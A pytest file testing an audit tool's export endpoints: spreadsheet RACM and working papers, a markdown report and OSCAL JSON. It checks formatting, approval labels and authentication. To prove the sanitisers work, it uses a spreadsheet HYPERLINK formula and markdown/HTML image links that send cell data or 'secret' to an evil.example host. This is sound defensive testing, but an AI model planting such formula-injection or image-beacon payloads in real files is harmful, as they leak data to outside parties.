"""Export endpoints: RACM / working papers .xlsx, report .md, OSCAL .json."""

import io
import json
import os
import sys
import uuid

import pytest
from fastapi.testclient import TestClient
from openpyxl import load_workbook

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from flow_builders import make_papers, make_racm, make_report  # type: ignore[import-not-found]
from api.exports import (
    RACM_HEADERS,
    WORKING_PAPER_HEADERS,
    sanitize_cell,
    sanitize_report,
)
from api.job_store import get_flow, remove_flow, set_flow
from swarm import session_manager
from swarm.audit_flow import AuditFlow
from swarm.demo import demo_final_report
from swarm.schema import WorkingPaperSchema
from swarm.state.repository import FlowRepository

AUTH = {"Authorization": "Bearer test-token"}
XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
EVIL = '=HYPERLINK("http://evil.example/?"&A1,"click")'


@pytest.fixture
def client(monkeypatch, tmp_path):
    monkeypatch.setenv("API_AUTH_TOKEN", "test-token")
    monkeypatch.setattr(
        session_manager, "SESSIONS_PATH", str(tmp_path / "audit_sessions.json")
    )
    from api.main import app

    return TestClient(app)


def _session(status: str, *, racm=None, papers=None, report=None, cache=True) -> str:
    sid = str(uuid.uuid4())
    flow = AuditFlow(initial_status=status)
    flow.state.theme = "S3"
    flow.state.racm_plan = racm
    flow.state.working_papers = papers
    flow.state.final_report = report
    flow.state.approval_trail = [
        {
            "gate": "Gate 1 (Planning)",
            "human": "alice",
            "timestamp": "2026-01-01T00:00:00+00:00",
            "action": "gate_approval",
        }
    ]
    session_manager.save_session(sid, "S3 audit", "ctx")
    FlowRepository().save(sid, flow)
    if cache:
        set_flow(sid, flow)
    else:
        remove_flow(sid)
    return sid


def _open(content: bytes):
    return load_workbook(io.BytesIO(content))


def _rows(ws):
    return [list(r) for r in ws.iter_rows(values_only=True)]


class TestSanitizeCell:
    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
    def test_formula_prefixes_neutralised(self, prefix):
        assert sanitize_cell(prefix + "1+1") == "'" + prefix + "1+1"

    def test_plain_text_untouched(self):
        assert sanitize_cell("CTRL-01") == "CTRL-01"
        assert sanitize_cell(None) == ""

    def test_illegal_xml_characters_stripped(self):
        assert sanitize_cell("a\x00b\x07c") == "abc"


def test_sanitize_report_strips_images():
    text = "ok ![x](http://evil/?d=secret) <IMG src='http://evil'> ![y][ref]"
    out = sanitize_report(text)
    assert "evil" not in out
    assert out.count("[Image removed for security]") == 3


class TestRacmExport:
    def test_headers_rows_and_injection(self, client):
        racm = make_racm()
        racm.risks[0].controls[0].description = EVIL
        racm.risks[0].description = "@SUM(1,2)"
        sid = _session("WAITING_HUMAN_GATE_1", racm=racm)

        r = client.get(f"/api/sessions/{sid}/export/racm.xlsx", headers=AUTH)
        assert r.status_code == 200
        assert r.headers["content-type"] == XLSX
        assert r.headers["content-disposition"] == (
            f'attachment; filename="racm-{sid[:8]}.xlsx"'
        )

        wb = _open(r.content)
        assert wb.sheetnames == ["Controls", "Export Info"]
        rows = _rows(wb["Controls"])
        assert rows[0] == RACM_HEADERS
        row = dict(zip(RACM_HEADERS, rows[1]))
        assert row["Risk ID"] == "RISK-01"
        assert row["Control ID"] == "CTRL-01"
        assert row["Control Description"] == "'" + EVIL
        assert row["Risk Description"] == "'@SUM(1,2)"
        assert "Inspect policy (Expect: OK)" in row["ToD Steps"]
        assert row["Substantive Steps"]  # substantive steps included
        # Control attributes and test design.
        assert row["Control Owner"] == "Cloud Platform Lead"
        assert row["Frequency"] == "Continuous"
        assert row["Nature"] == "Automated"
        assert row["Type"] == "Preventive"
        assert row["Key Control"] == "Yes"
        assert row["Assertions / Objectives"] == "Confidentiality"
        assert row["Population Source"] == "All S3 buckets"
        assert row["Population Completeness"] == "Agree to console count"
        assert row["Sample Size"] == "1"
        assert row["Sampling Method"] == "Test of one"
        assert row["Period of Reliance"] == "FY2026"
        # No cell is stored as a formula.
        for row in wb["Controls"].iter_rows():
            for cell in row:
                assert cell.data_type != "f"

        info = dict(_rows(wb["Export Info"])[1:])
        assert info["Planning artifact"] == "Awaiting human approval at Gate 1"

    def test_rejected_draft_is_labelled(self, client):
        sid = _session("QA_REJECTED_PHASE_1", racm=make_racm())
        r = client.get(f"/api/sessions/{sid}/export/racm.xlsx", headers=AUTH)
        info = dict(_rows(_open(r.content)["Export Info"])[1:])
        assert info["Planning artifact"].startswith("DRAFT REJECTED BY QA")

    def test_loads_from_disk_when_not_cached(self, client):
        sid = _session("WAITING_HUMAN_GATE_2", racm=make_racm(), cache=False)
        r = client.get(f"/api/sessions/{sid}/export/racm.xlsx", headers=AUTH)
        assert r.status_code == 200
        info = dict(_rows(_open(r.content)["Export Info"])[1:])
        assert info["Planning artifact"] == "Approved at Gate 1"
        # A download does not cache the flow as a side effect.
        assert get_flow(sid) is None


class TestWorkingPapersExport:
    def test_headers_rows_and_injection(self, client):
        papers = make_papers()
        papers.findings[0].exact_quote_from_evidence = "-2+3"
        papers.findings[0].test_conclusion = EVIL
        sid = _session("WAITING_HUMAN_GATE_2", racm=make_racm(), papers=papers)

        r = client.get(f"/api/sessions/{sid}/export/working-papers.xlsx", headers=AUTH)
        assert r.status_code == 200
        assert r.headers["content-type"] == XLSX
        assert "working-papers-" in r.headers["content-disposition"]
        rows = _rows(_open(r.content)["Findings"])
        assert rows[0] == WORKING_PAPER_HEADERS
        row = dict(zip(WORKING_PAPER_HEADERS, rows[1]))
        assert row["Control ID"] == "CTRL-01"
        assert row["ToD Conclusion"] == "Effective"
        assert row["ToE Conclusion"] == "Effective"
        assert row["Result"] == "No exception"
        assert row["Preliminary Deficiency"] == "No"
        assert row["Conclusion"] == "'" + EVIL
        assert row["Evidence Quote"] == "'-2+3"
        assert row["Vault ID"] == "vault-abc123"
        assert row["Quote Verified in Vault"] == "No"  # not a real vault record

    def test_not_tested_and_legacy_findings(self, client):
        papers = WorkingPaperSchema.model_validate(
            {
                "theme": "S3",
                "findings": [
                    {
                        "control_id": "CTRL-09",
                        "tod_conclusion": "Not tested",
                        "toe_conclusion": "Not tested",
                        "test_conclusion": "No tool covers this control.",
                    },
                    {
                        "control_id": "CTRL-01",
                        "vault_id_reference": "vault-old",
                        "exact_quote_from_evidence": "BlockPublicAcls: false",
                        "test_conclusion": "Old-format finding.",
                        "severity": "Significant Deficiency",
                    },
                ],
            }
        )
        sid = _session("WAITING_HUMAN_GATE_2", racm=make_racm(), papers=papers)
        r = client.get(f"/api/sessions/{sid}/export/working-papers.xlsx", headers=AUTH)
        wb = _open(r.content)
        rows = [dict(zip(WORKING_PAPER_HEADERS, x)) for x in _rows(wb["Findings"])[1:]]
        assert rows[0]["Result"] == "Not tested"
        assert rows[0]["Quote Verified in Vault"] == "n/a (no evidence)"
        assert rows[1]["Result"] == "Exception"
        assert rows[1]["Preliminary Deficiency"] == "Yes"
        assert rows[1]["Legacy Severity"] == "Significant Deficiency"
        notes = [v for k, v in _rows(wb["Export Info"])[1:] if k == "Note"]
        assert any("Legacy Severity" in n for n in notes)

    def test_404_before_fieldwork(self, client):
        sid = _session("WAITING_HUMAN_GATE_1", racm=make_racm())
        r = client.get(f"/api/sessions/{sid}/export/working-papers.xlsx", headers=AUTH)
        assert r.status_code == 404


class TestReportExport:
    def test_markdown(self, client):
        report = make_report()
        report.detailed_report = "See ![x](http://evil.example/?q=1)"
        sid = _session(
            "COMPLETED", racm=make_racm(), papers=make_papers(), report=report
        )
        r = client.get(f"/api/sessions/{sid}/export/report.md", headers=AUTH)
        assert r.status_code == 200
        assert r.headers["content-type"] == "text/markdown; charset=utf-8"
        assert f'filename="report-{sid[:8]}.md"' in r.headers["content-disposition"]
        body = r.text
        assert body.startswith("# GRC Audit Report — S3 audit")
        assert "Approved at Gate 3" in body
        assert "## Executive Summary\n\nNo exceptions." in body
        assert "evil.example" not in body
        assert "**Gate 1 (Planning)** — alice" in body

    def test_deficiency_evaluation_section(self, client):
        report = demo_final_report("S3")
        report.deficiency_evaluations[0].rationale = "A | B ![x](http://evil.example/)"
        sid = _session("WAITING_HUMAN_GATE_3", report=report)
        body = client.get(f"/api/sessions/{sid}/export/report.md", headers=AUTH).text
        assert "## Deficiency Evaluation (proposed)" in body
        assert "for the auditor's judgement at Gate 3. Scale: Risk rating." in body
        row = next(line for line in body.splitlines() if line.startswith("| DEF-01"))
        assert "| CTRL-02 | RISK-02 | Medium | High | High |" in row
        assert "A \\| B" in row  # a pipe in model text cannot break the table
        assert "evil.example" not in body
        assert body.index("## Deficiency Evaluation") < body.index("## Approval Trail")

    def test_report_without_evaluations_says_so(self, client):
        sid = _session("COMPLETED", report=make_report())
        body = client.get(f"/api/sessions/{sid}/export/report.md", headers=AUTH).text
        assert "No deficiencies were proposed." in body
        assert "was approved at Gate 3 (see Approval Trail)" in body
        assert "Scale: not stated." in body

    def test_rejected_report_is_labelled(self, client):
        sid = _session("QA_REJECTED_PHASE_3", report=make_report())
        body = client.get(f"/api/sessions/{sid}/export/report.md", headers=AUTH).text
        assert "DRAFT REJECTED BY QA" in body

    def test_404_without_report(self, client):
        sid = _session("WAITING_HUMAN_GATE_2", papers=make_papers())
        r = client.get(f"/api/sessions/{sid}/export/report.md", headers=AUTH)
        assert r.status_code == 404


class TestOscalExport:
    def test_json(self, client):
        sid = _session("COMPLETED", report=demo_final_report("S3"))
        r = client.get(f"/api/sessions/{sid}/export/oscal.json", headers=AUTH)
        assert r.status_code == 200
        assert r.headers["content-type"] == "application/json"
        data = json.loads(r.content)
        assert set(data) == {"metadata", "import_ap", "results"}
        assert data["results"][0]["observations"]

    def test_404_when_report_has_no_oscal(self, client):
        sid = _session("COMPLETED", report=make_report())
        r = client.get(f"/api/sessions/{sid}/export/oscal.json", headers=AUTH)
        assert r.status_code == 404


class TestAccess:
    @pytest.mark.parametrize(
        "path", ["racm.xlsx", "working-papers.xlsx", "report.md", "oscal.json"]
    )
    def test_requires_auth(self, client, path):
        sid = _session("COMPLETED", racm=make_racm())
        r = client.get(f"/api/sessions/{sid}/export/{path}")
        assert r.status_code == 401

    def test_unknown_session_404(self, client):
        r = client.get("/api/sessions/nope/export/racm.xlsx", headers=AUTH)
        assert r.status_code == 404
